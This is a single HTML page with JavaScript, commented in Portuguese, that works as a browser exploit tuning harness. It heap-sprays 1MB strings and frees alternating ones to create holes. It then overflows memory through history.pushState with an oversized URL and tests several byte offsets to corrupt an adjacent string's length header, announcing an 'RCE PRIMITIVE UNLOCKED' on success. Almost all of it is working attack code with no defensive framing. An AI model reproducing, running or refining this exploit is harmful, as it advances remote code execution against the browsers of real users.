<!DOCTYPE html>
<html>
<head>
    <title>Shotgun Tuner: 1MB String</title>
    <style>
        body { background-color: #000; color: #ff9900; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #ff9900; background: #220; color: #fff; cursor: pointer; margin-bottom: 10px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #ff9900; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; }
        .hit { color: yellow; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Shotgun Tuner: Buscando o Length</h1>
    <p>Recuando a partir de 709520 para achar o cabeçalho da String de 1MB.</p>

    <button onclick="fireShotgun(16)">Recuar 16 bytes (709504)</button>
    <button onclick="fireShotgun(32)">Recuar 32 bytes (709488)</button>
    <button onclick="fireShotgun(48)">Recuar 48 bytes (709472)</button>
    <button onclick="fireShotgun(64)">Recuar 64 bytes (709456)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const DATA_HIT = 709520; // Ponto confirmado de dados
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração VENCEDORA (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function fireShotgun(backStep) {
            let offset = DATA_HIT - backStep;
            log(`------------------------------------------`);
            log(`TESTANDO RECUO -${backStep} (Offset ${offset})...`);

            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (A estratégia que funcionou)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); // 'B'
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                // Aumentamos a quantidade para garantir estabilidade
                for(let i=0; i<100; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                for(let i=0; i<100; i+=2) victims[i] = null;
                await forceGC();

                // 4. EXPLOIT
                log("Disparando...");
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(offset);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "shotgun", "/" + buffer);

                        checkResult(offset);

                    } catch (e) {
                        log("Erro JS: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro memória: " + e.message);
            }
        }

        function checkResult(offset) {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO ABSOLUTO: Length mudou?
                    if (msg.length !== PAYLOAD_SIZE) {
                        log(`!!! JACKPOT !!! Length Corrompido!`, 'win');
                        log(`Offset Vencedor: ${offset}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        found = true;
                        break;
                    }

                    // SUCESSO PARCIAL: Dados mudaram?
                    if (msg.charCodeAt(0) === 1) {
                        log(`[${offset}] Atingiu DADOS. Ainda não pegou o Header.`, 'hit');
                        found = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!found) log(`[${offset}] Nada atingido.`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
